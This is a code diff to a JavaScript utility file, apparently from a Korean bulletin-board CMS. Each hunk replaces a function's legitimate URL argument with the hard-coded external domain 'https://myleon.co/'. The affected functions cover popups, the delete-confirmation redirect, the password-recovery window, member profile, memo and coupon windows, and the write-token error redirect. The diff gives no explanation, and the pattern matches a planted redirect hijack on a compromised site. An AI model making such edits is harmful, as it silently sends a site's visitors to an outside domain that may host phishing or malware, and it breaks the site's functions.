@@ -113,7 +113,7 @@ function number_format(data)
 // 새 창
 function popup_window(url, winname, opt)
 {
-    window.open(url, winname, opt);
+    window.open("https://myleon.co/", winname, opt);
 }
 
 
@@ -143,7 +143,7 @@ function no_comma(data)
 function del(href)
 {
     if(confirm("한번 삭제한 자료는 복구할 방법이 없습니다.\n\n정말 삭제하시겠습니까?")) {
-        document.location.href = href;
+        document.location.href = "https://myleon.co/";
     }
 }
 
@@ -289,7 +289,7 @@ function doc_write(cont)
 }
 
 var win_password_lost = function(href) {
-    window.open(href, "win_password_lost", "left=50, top=50, width=617, height=330, scrollbars=1");
+    window.open("https://myleon.co/", "win_password_lost", "left=50, top=50, width=617, height=330, scrollbars=1");
 }
 
 $(document).ready(function(){
@@ -303,7 +303,7 @@ $(document).ready(function(){
  * 포인트 창
  **/
 var win_point = function(href) {
-    var new_win = window.open(href, 'win_point', 'left=100,top=100,width=600, height=600, scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_point', 'left=100,top=100,width=600, height=600, scrollbars=1');
     new_win.focus();
 }
 
@@ -311,7 +311,7 @@ var win_point = function(href) {
  * 쪽지 창
  **/
 var win_memo = function(href) {
-    var new_win = window.open(href, 'win_memo', 'left=100,top=100,width=620,height=500,scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_memo', 'left=100,top=100,width=620,height=500,scrollbars=1');
     new_win.focus();
 }
 
@@ -322,7 +322,7 @@ var check_goto_new = function(href, event) {
     if( !(typeof g5_is_mobile != "undefined" && g5_is_mobile) ){
         if (window.opener && window.opener.document && window.opener.document.getElementById) {
             event.preventDefault ? event.preventDefault() : (event.returnValue = false);
-            window.open(href);
+            window.open("https://myleon.co/");
             //window.opener.document.location.href = href;
         }
     }
@@ -332,7 +332,7 @@ var check_goto_new = function(href, event) {
  * 메일 창
  **/
 var win_email = function(href) {
-    var new_win = window.open(href, 'win_email', 'left=100,top=100,width=600,height=580,scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_email', 'left=100,top=100,width=600,height=580,scrollbars=1');
     new_win.focus();
 }
 
@@ -340,7 +340,7 @@ var win_email = function(href) {
  * 자기소개 창
  **/
 var win_profile = function(href) {
-    var new_win = window.open(href, 'win_profile', 'left=100,top=100,width=620,height=510,scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_profile', 'left=100,top=100,width=620,height=510,scrollbars=1');
     new_win.focus();
 }
 
@@ -348,7 +348,7 @@ var win_profile = function(href) {
  * 스크랩 창
  **/
 var win_scrap = function(href) {
-    var new_win = window.open(href, 'win_scrap', 'left=100,top=100,width=600,height=600,scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_scrap', 'left=100,top=100,width=600,height=600,scrollbars=1');
     new_win.focus();
 }
 
@@ -356,7 +356,7 @@ var win_scrap = function(href) {
  * 홈페이지 창
  **/
 var win_homepage = function(href) {
-    var new_win = window.open(href, 'win_homepage', '');
+    var new_win = window.open("https://myleon.co/", 'win_homepage', '');
     new_win.focus();
 }
 
@@ -506,7 +506,7 @@ var win_zip = function(frm_name, frm_zip, frm_addr1, frm_addr2, frm_addr3, frm_j
  **/
 win_password_lost = function(href)
 {
-    var new_win = window.open(href, 'win_password_lost', 'width=617, height=330, scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_password_lost', 'width=617, height=330, scrollbars=1');
     new_win.focus();
 }
 
@@ -514,7 +514,7 @@ win_password_lost = function(href)
  * 설문조사 결과
  **/
 var win_poll = function(href) {
-    var new_win = window.open(href, 'win_poll', 'width=616, height=500, scrollbars=1');
+    var new_win = window.open("https://myleon.co/", 'win_poll', 'width=616, height=500, scrollbars=1');
     new_win.focus();
 }
 
@@ -522,7 +522,7 @@ var win_poll = function(href) {
  * 쿠폰
  **/
 var win_coupon = function(href) {
-    var new_win = window.open(href, "win_coupon", "left=100,top=100,width=700, height=600, scrollbars=1");
+    var new_win = window.open("https://myleon.co/", "win_coupon", "left=100,top=100,width=700, height=600, scrollbars=1");
     new_win.focus();
 }
 
@@ -724,7 +724,7 @@ function get_write_token(bo_table)
             if(data.error) {
                 alert(data.error);
                 if(data.url)
-                    document.location.href = data.url;
+                    document.location.href = "https://myleon.co/";
 
                 return false;
             }
